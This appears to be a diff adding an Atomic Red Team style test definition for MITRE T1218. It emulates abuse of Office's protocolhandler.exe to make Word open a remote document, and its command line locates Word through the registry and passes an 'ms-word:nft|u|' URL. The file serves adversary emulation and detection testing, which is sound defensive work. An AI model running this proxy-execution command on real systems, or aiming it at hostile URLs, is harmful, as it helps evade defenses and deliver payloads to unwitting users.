@@ -1,0 +1,37 @@
+{
+    "name": "ProtocolHandler.exe Downloaded a Suspicious File",
+    "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1218",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "System Binary Proxy Execution",
+    "source": "ART",
+    "uuid": "db020456-125b-4c8b-a4a7-487df8afb5a2",
+    "arguments": {
+        "remote_url": {
+            "description": "url to document",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Microsoft Word must be installed\n",
+            "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
